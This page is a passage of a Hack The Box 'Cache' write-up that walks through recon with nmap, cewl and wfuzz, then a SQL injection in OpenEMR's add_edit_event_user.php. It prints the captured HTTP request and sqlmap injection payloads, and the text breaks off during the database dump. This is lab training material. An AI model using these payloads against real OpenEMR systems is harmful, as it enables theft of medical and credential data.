<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <script type="text/javascript" src="/scripts/lightbox/lightbox.js"></script><link rel="stylesheet" href="/scripts/lightbox/lightbox.css"> <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script> <script> var OneSignal = window.OneSignal || []; OneSignal.push(function() { OneSignal.init({ appId: "7174cacd-26ac-4796-aa89-4928af4847f1", }); }); </script><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="description" content="Using cewl to make a custom wordlist from thr page author.html , used wfuzz to find the another domain and sqli in the add_edit_event_user.php , using sqlmap to dump the table user_secure and got the credentials for the openEmr panel.Editing the file config.php and embeding php reverse shell to get initial shell as www-data.The file jquery/functionality.js contains user ash password.Memcached service is ruuning locally. Getting user luffy credentials By dumping data from memcache by Monitoring using Watchers and manually.The user luffy is in the group docker.Displaying docker images got ubuntu and Spawning a root-shell." /><meta property="og:title" content="Hackthebox Cache writeup" /><meta property="og:description" content="Using cewl to make a custom wordlist from thr page author.html , used wfuzz to find the another domain and sqli in the add_edit_event_user.php , using sqlmap to dump the table user_secure and got the credentials for the openEmr panel.Editing the file config.php and embeding php reverse shell to get initial shell as www-data.The file jquery/functionality.js contains user ash password.Memcached service is ruuning locally. Getting user luffy credentials By dumping data from memcache by Monitoring using Watchers and manually.The user luffy is in the group docker.Displaying docker images got ubuntu and Spawning a root-shell." /><meta property="og:image" content="https://0xprashant.github.io/hackthebox/cache/cache.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@0xprashant"><meta property="twitter:title" content="Hackthebox Cache writeup"><meta name="twitter:creator" content="@0xprashant"><meta name="twitter:description" content="Using cewl to make a custom wordlist from thr page author.html , used wfuzz to find the another domain and sqli in the add_edit_event_user.php , using sqlmap to dump the table user_secure and got the credentials for the openEmr panel.Editing the file config.php and embeding php reverse shell to get initial shell as www-data.The file jquery/functionality.js contains user ash password.Memcached service is ruuning locally. Getting user luffy credentials By dumping data from memcache by Monitoring using Watchers and manually.The user luffy is in the group docker.Displaying docker images got ubuntu and Spawning a root-shell."><meta name="twitter:image" content="https://0xprashant.github.io/hackthebox/cache/cache.png"><title>Hackthebox Cache writeup | 0xPrashant</title><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">0xPrashant</a></div><div class="site-subtitle font-italic">InfoSec/Cybersec Blog And Writeups</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.hackthebox.eu/home/users/profile/84820" target="_blank"></i> <i class="fas fa-cube"></i> </a> <a href="https://github.com/0xprashant" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://discordapp.com/users/476931503981592607" target="_blank"> <i class="fab fa-discord"></i> </a> <a href="https://twitter.com/0xprashant" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/prashant-saini-8a7a1a162" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hackthebox Cache writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Cache writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, May 10, 2020, 12:00 AM +0800" > May 10 <i class="unloaded">2020-05-10T00:00:00+08:00</i> </span> by <span class="author"> Prashant Saini </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/cache/cache.png" class="post-preview-img"><blockquote><p>I got the root flag first becasue i was able to pwn root wihout getting <code class="language-plaintext highlighter-rouge">ash</code> user credentials</p></blockquote><h1 id="introductioncache">Introduction@cache:~$</h1><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Name<td>Cache<tr><td>IP<td>10.10.10.188<tr><td>Points<td>30<tr><td>Os<td>Linux<tr><td>Difficulty<td>Medium<tr><td>Creator<td><a href="https://www.hackthebox.eu/home/users/profile/23227" target="_blank">ASHacker</a><tr><td>Out On<td>9 May 2020</table></div><h1 id="briefcache">Brief@cache:~$</h1><p>The story starts from : Using <code class="language-plaintext highlighter-rouge">cewl</code> to make a custom <code class="language-plaintext highlighter-rouge">wordlist</code> from thr page <strong>author.html</strong> , used <code class="language-plaintext highlighter-rouge">wfuzz</code> to find the <strong>another</strong> domain and <code class="language-plaintext highlighter-rouge">sqli</code> in the <strong>add_edit_event_user.php</strong> , using <code class="language-plaintext highlighter-rouge">sqlmap</code> to dump the <strong>table</strong> <code class="language-plaintext highlighter-rouge">user_secure</code> and got the <code class="language-plaintext highlighter-rouge">credentials</code> for the <strong>openEmr</strong> panel.Editing the file <code class="language-plaintext highlighter-rouge">config.php</code> and embeding <strong>php reverse shell</strong> to get initial shell as <code class="language-plaintext highlighter-rouge">www-data</code>.The file <code class="language-plaintext highlighter-rouge">jquery/functionality.js</code> contains user <strong>ash</strong> password.<strong>Memcached</strong> service is ruuning locally. Getting user <code class="language-plaintext highlighter-rouge">luffy</code> <strong>credentials</strong> By dumping data from <code class="language-plaintext highlighter-rouge">memcache</code> by <strong>Monitoring using Watchers</strong> and manually.The user <code class="language-plaintext highlighter-rouge">luffy</code> is in the group <strong>docker</strong>.Displaying docker images got <code class="language-plaintext highlighter-rouge">ubuntu</code> and Spawning a root-shell.</p><h1 id="summary">Summary</h1><ul><li>Making a custom wordlist from the page <code class="language-plaintext highlighter-rouge">author.html</code> using <code class="language-plaintext highlighter-rouge">cewl</code><li>Using <strong>Wfuzz</strong> to find the correct <strong>domain</strong><li>Got a valid domain <code class="language-plaintext highlighter-rouge">HMS.htb</code><li>Finding a <code class="language-plaintext highlighter-rouge">sqli</code> on <strong>openEmr</strong> application<li>Using <code class="language-plaintext highlighter-rouge">sqlmap</code> to dump the database<li>Dumping the table <strong>user_secure</strong><li>Cracked the hash <code class="language-plaintext highlighter-rouge">using</code> john<li>Logged in to the <strong>openEmr</strong> panel<li>editing the file <code class="language-plaintext highlighter-rouge">config.php</code> and embeding the <strong>php reverse shell</strong> and accessing it.<li>Got shell <code class="language-plaintext highlighter-rouge">www-data</code><li><strong>Memcache</strong> service is running <code class="language-plaintext highlighter-rouge">locally</code><li><code class="language-plaintext highlighter-rouge">monitoring</code> with watch.<li>Dump the username and password for user <code class="language-plaintext highlighter-rouge">luffy</code><li>Logged in as <code class="language-plaintext highlighter-rouge">luffy</code>.<li>The user is in <strong>group</strong> <code class="language-plaintext highlighter-rouge">docker</code><li>Displaying the available <strong>images</strong> and we got <code class="language-plaintext highlighter-rouge">ubuntu</code> as valid<li>And <code class="language-plaintext highlighter-rouge">mounting</code> the images<li>Got root shell<li>got <code class="language-plaintext highlighter-rouge">user.txt</code><li>Got <code class="language-plaintext highlighter-rouge">root.txt</code></ul><h1 id="pwned">Pwned</h1><html><head><link rel="stylesheet" type="text/css" href="/asciinema-player.css" /><body> <asciinema-player src="/hackthebox/cache/cache.cast" start-at="0" autoplay="1.5" speed="2.0" loop="1" cols="150" rows="20"></asciinema-player> <script src="/asciinema-player.js"></script><h1 id="recon">Recon</h1><h2 id="nmap">Nmap</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>➜  scans nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-T4</span> <span class="nt">-p-</span> <span class="nt">-v</span> <span class="nt">-oA</span> scans/nmap.full cache.htb
<span class="c"># Nmap 7.70 scan initiated Sun May 10 02:44:27 2020 as: nmap -sC -sV -T4 -p- -v -oA scans/nmap.full cache.htb</span>
Increasing send delay <span class="k">for </span>10.10.10.188 from 0 to 5 due to 2535 out of 6337 dropped probes since last increase.
Warning: 10.10.10.188 giving up on port because retransmission cap hit <span class="o">(</span>6<span class="o">)</span><span class="nb">.</span>
Nmap scan report <span class="k">for </span>cache.htb <span class="o">(</span>10.10.10.188<span class="o">)</span>
Host is up <span class="o">(</span>0.32s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65481 closed ports, 52 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 <span class="o">(</span>RSA<span class="o">)</span>
|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Cache
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Sun May 10 03:09:20 2020 -- 1 IP address (1 host up) scanned in 1492.62 seconds</span>
</pre></table></code></div></div><p>Only two prts <code class="language-plaintext highlighter-rouge">22:ssh</code> and <code class="language-plaintext highlighter-rouge">80:http</code> are opened so the only way to get started is port <code class="language-plaintext highlighter-rouge">80</code></p><h2 id="port-80">Port 80</h2><p>When we visit the <code class="language-plaintext highlighter-rouge">http</code> port we have the following <code class="language-plaintext highlighter-rouge">webpage</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/cache/5dd80ad3-e48a-408c-8ab7-48c14ec9a481/image-1.png" alt="Port-80" /></p><p>And there is a <code class="language-plaintext highlighter-rouge">login</code> page on which i wasted my lot of time</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/cache/5dd80ad3-e48a-408c-8ab7-48c14ec9a481/image-2.png" alt="Login-page" /></p><p>I tried <code class="language-plaintext highlighter-rouge">bruteforce</code> and <code class="language-plaintext highlighter-rouge">sqli</code> on the login page but thats just a <code class="language-plaintext highlighter-rouge">rabbit-hole</code>.I tried finding the subdomain also but failed to find something.</p><h1 id="finding-a-new-domain">Finding a new domain</h1><h2 id="creating-the-wordlist-using-cewl">Creating the wordlist using CEWL</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/cache/5dd80ad3-e48a-408c-8ab7-48c14ec9a481/author.png" alt="Login-page" /></p><p>Now i created a custom <code class="language-plaintext highlighter-rouge">wordlist</code> from the page <code class="language-plaintext highlighter-rouge">author.html</code> .</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>➜  cache cewl <span class="nt">-w</span> customwordlist <span class="nt">-d</span> 10 <span class="nt">-m</span> 1 http://cache.htb/author.html
CeWL 5.4.4.1 <span class="o">(</span>Arkanoid<span class="o">)</span> Robin Wood <span class="o">(</span>robin@digi.ninja<span class="o">)</span> <span class="o">(</span>https://digi.ninja/<span class="o">)</span>
➜  cache <span class="nb">wc </span>customwordlist 
 636  636 4634 customwordlist
➜  cache 
</pre></table></code></div></div><h2 id="wfuzz-to-find-the-domain">Wfuzz to find the domain</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>➜  cache wfuzz  <span class="nt">--hh</span> 8193  <span class="nt">-H</span> <span class="s1">'Host: FUZZ.htb'</span> <span class="nt">-u</span> http://10.10.10.188/ <span class="nt">--hc</span> 400 <span class="nt">-w</span> customwordlist

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzzs documentation <span class="k">for </span>more information.

<span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 2.3.4 - The Web Fuzzer                         <span class="k">*</span>
<span class="k">********************************************************</span>

Target: http://10.10.10.188/
Total requests: 636

<span class="o">==================================================================</span>
ID   Response   Lines      Word         Chars          Payload    
<span class="o">==================================================================</span>

000415:  <span class="nv">C</span><span class="o">=</span>302      0 L	       0 W	      0 Ch	  <span class="s2">"HMS"</span>

Total <span class="nb">time</span>: 23.54022
Processed Requests: 636
Filtered Requests: 635
Requests/sec.: 27.01758
</pre></table></code></div></div><p>And then add the <code class="language-plaintext highlighter-rouge">host</code> to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p><h1 id="hmshtb">HMS.htb</h1><p>Now we can access the new domain and its <code class="language-plaintext highlighter-rouge">running</code> on application <code class="language-plaintext highlighter-rouge">openemr</code></p><p><a href="/hackthebox/cache/5dd80ad3-e48a-408c-8ab7-48c14ec9a481/image-3.png" target="_blank"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/cache/5dd80ad3-e48a-408c-8ab7-48c14ec9a481/image-3.png" alt="HMS.htb" /></a></p><p>After Spending much time on the login again , googled about the <code class="language-plaintext highlighter-rouge">application</code> there are many public <code class="language-plaintext highlighter-rouge">exploits</code> available on internet.</p><p>And i got one bug to be <code class="language-plaintext highlighter-rouge">working</code></p><blockquote><p>SQL Injection in add_edit_event_user.php</p></blockquote><p>There are two <code class="language-plaintext highlighter-rouge">references</code> i used</p><blockquote><p><a href="https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf" target="_blank">https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf</a></p></blockquote><blockquote><p><a href="https://www.youtube.com/watch?v=DJSQ8Pk_7hc" target="_blank">https://www.youtube.com/watch?v=DJSQ8Pk_7hc</a></p></blockquote><iframe width="750" height="500" src="http://www.youtube.com/embed/DJSQ8Pk_7hc" frameborder="0"> </iframe><p>As in the video we can see that the vuln parameter is <code class="language-plaintext highlighter-rouge">add_edit_event_user.php</code>.</p><p>We can see a <code class="language-plaintext highlighter-rouge">additional</code> dir called <code class="language-plaintext highlighter-rouge">portal</code> where we can <strong>register</strong> ourself but it will show</p><p><code class="language-plaintext highlighter-rouge">Opps ! something went wrong</code></p><h2 id="what-we-need-to-do">what we need to do</h2><ul><li>Fill in the <code class="language-plaintext highlighter-rouge">details</code><li>Click on <code class="language-plaintext highlighter-rouge">login</code><li>now got to <code class="language-plaintext highlighter-rouge">add_edit_event_user.php</code><li>And click on <strong>register</strong></ul><p>and then you will be forwarded to</p><blockquote><p><a href="http://hms.htb/portal/account/register.php" target="_blank">http://hms.htb/portal/account/register.php</a></p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/cache/5dd80ad3-e48a-408c-8ab7-48c14ec9a481/image-4.png" alt="HMS.htb" /></p><p>Fill the details –</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/cache/5dd80ad3-e48a-408c-8ab7-48c14ec9a481/image-5.png" alt="HMS.htb" /></p><p>And click on login…….</p><p>Now just go to</p><blockquote><p><a href="http://hms.htb/portal/add_edit_event_user.php" target="_blank">http://hms.htb/portal/add_edit_event_user.php</a></p></blockquote><p>And now click on <code class="language-plaintext highlighter-rouge">register</code> and you will be forwarded to</p><blockquote><p><a href="http://hms.htb/portal/account/register.php" target="_blank">http://hms.htb/portal/account/register.php</a></p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/cache/5dd80ad3-e48a-408c-8ab7-48c14ec9a481/image-6.png" alt="HMS.htb" /></p><p>And now if we goto the following we can access the file now</p><blockquote><p><a href="http://hms.htb/portal/add_edit_event_user.php" target="_blank">http://hms.htb/portal/add_edit_event_user.php</a></p></blockquote><p>Now we can go for the <code class="language-plaintext highlighter-rouge">vulnerbale</code> parameter <code class="language-plaintext highlighter-rouge">?eid=</code></p><p>and confirm the sqli with a simple <code class="language-plaintext highlighter-rouge">single-quote</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/cache/5dd80ad3-e48a-408c-8ab7-48c14ec9a481/image-7.png" alt="HMS.htb" /></p><p>And now i can use sqlmap here , i just intercept the request using <code class="language-plaintext highlighter-rouge">burp-suite</code> and save the request in a <code class="language-plaintext highlighter-rouge">file</code> called <strong>login.req</strong></p><blockquote><p>login.req</p></blockquote><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/portal/add_edit_event_user.php?eid=1</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">hms.htb</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9,hi;q=0.8</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">OpenEMR=0crb94kfcniml3dgittqr6uvae; PHPSESSID=0v414a6qm46hu08dfq59k1nc83</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
</pre></table></code></div></div><p>And now i used <code class="language-plaintext highlighter-rouge">sqlmap</code></p><h1 id="sqlmap-to-dump-database">Sqlmap to dump database</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre><td class="rouge-code"><pre>➜  cache sqlmap <span class="nt">-r</span> login.req <span class="nt">--threads</span><span class="o">=</span>10 <span class="nt">--dbs</span>
        ___
       __H__
 ___ ___[<span class="o">)]</span>_____ ___ ___  <span class="o">{</span>1.3.4#stable<span class="o">}</span>
|_ -| <span class="nb">.</span> <span class="o">[</span>.]     | .<span class="s1">'| . |
|___|_  ['</span><span class="o">]</span>_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

<span class="o">[!]</span> legal disclaimer: Usage of sqlmap <span class="k">for </span>attacking targets without prior mutual consent is illegal. It is the end <span class="nb">users </span>responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for </span>any misuse or damage caused by this program

<span class="o">[</span><span class="k">*</span><span class="o">]</span> starting @ 12:59:11 /2020-05-10/

<span class="o">[</span>12:59:11] <span class="o">[</span>INFO] parsing HTTP request from <span class="s1">'login.req'</span>
<span class="o">[</span>12:59:12] <span class="o">[</span>INFO] resuming back-end DBMS <span class="s1">'mysql'</span> 
<span class="o">[</span>12:59:12] <span class="o">[</span>INFO] testing connection to the target URL
<span class="o">[</span>12:59:13] <span class="o">[</span>WARNING] there is a DBMS error found <span class="k">in </span>the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point<span class="o">(</span>s<span class="o">)</span> from stored session:
<span class="nt">---</span>
Parameter: eid <span class="o">(</span>GET<span class="o">)</span>
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace <span class="o">(</span>original value<span class="o">)</span>
    Payload: <span class="nv">eid</span><span class="o">=(</span>SELECT <span class="o">(</span>CASE WHEN <span class="o">(</span><span class="nv">3423</span><span class="o">=</span>3423<span class="o">)</span> THEN 1 ELSE <span class="o">(</span>SELECT 9802 UNION SELECT 8164<span class="o">)</span> END<span class="o">))</span>

    Type: error-based
    Title: MySQL <span class="o">&gt;=</span> 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="o">(</span>EXTRACTVALUE<span class="o">)</span>
    Payload: <span class="nv">eid</span><span class="o">=</span>1 AND EXTRACTVALUE<span class="o">(</span>8000,CONCAT<span class="o">(</span>0x5c,0x71706a7171,<span class="o">(</span>SELECT <span class="o">(</span>ELT<span class="o">(</span><span class="nv">8000</span><span class="o">=</span>8000,1<span class="o">)))</span>,0x7176717871<span class="o">))</span>

    Type: UNION query
    Title: Generic UNION query <span class="o">(</span>NULL<span class="o">)</span> - 4 columns
    Payload: <span class="nv">eid</span><span class="o">=</span>1 UNION ALL SELECT NULL,NULL,CONCAT<span class="o">(</span>0x71706a7171,0x526b586553736c6a7551504c4543594765744c5853444957694a776d6f46714f7965637a7072514b,0x7176717871<span class="o">)</span>,NULL-- qQvr
<span class="nt">---</span>
<span class="o">[</span>12:59:13] <span class="o">[</span>INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL <span class="o">&gt;=</span> 5.1
<span class="o">[</span>12:59:13] <span class="o">[</span>INFO] fetching database names
<span class="o">[</span>12:59:14] <span class="o">[</span>INFO] used SQL query returns 2 entries
<span class="o">[</span>12:59:14] <span class="o">[</span>INFO] starting 2 threads
<span class="o">[</span>12:59:14] <span class="o">[</span>INFO] resumed: <span class="s1">'information_schema'</span>
<span class="o">[</span>12:59:14] <span class="o">[</span>INFO] resumed: <span class="s1">'openemr'</span>
available databases <span class="o">[</span>2]:                                                       
<span class="o">[</span><span class="k">*</span><span class="o">]</span> information_schema
<span class="o">[</span><span class="k">*</span><span class="o">]</span> openemr

<span class="o">[</span>12:59:14] <span class="o">[</span>INFO] fetched data logged to text files under <span class="s1">'/root/.sqlmap/output/hms.htb'</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> ending @ 12:59:14 /2020-05-10/
</pre></table></code></div></div><p>we got two <code class="language-plaintext highlighter-rouge">databases</code></p><ul><li><code class="language-plaintext highlighter-rouge">information_schema</code><li><strong>openemr</strong></ul><blockquote><p>Dumping tables in db <code class="language-plaintext highlighter-rouge">openemr</code></p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>➜  cache sqlmap <span class="nt">-r</span> login.req <span class="nt">--threads</span><span class="o">=</span>10 <span class="nt">-D</span> openemr <span class="nt">--table</span>
</pre></table></code></div></div><p>From this query we got all the tables in <code class="language-plaintext highlighter-rouge">openemr</code> db .</p><blockquote><p>the o/p is very long so cant show the full</p></blockquote><p>There is a table called <code class="language-plaintext highlighter-rouge">users_secure</code></p><blockquote><p>Dumping columns from table <code class="language-plaintext highlighter-rouge">users_secure</code></p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>➜  cache sqlmap <span class="nt">-r</span> login.req <span class="nt">--threads</span><span class="o">=</span>10 <span class="nt">-D</span> openemr <span class="nt">-T</span> users_secure <span class="nt">--column</span>
</pre></table></code></div></div><blockquote><p>output</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
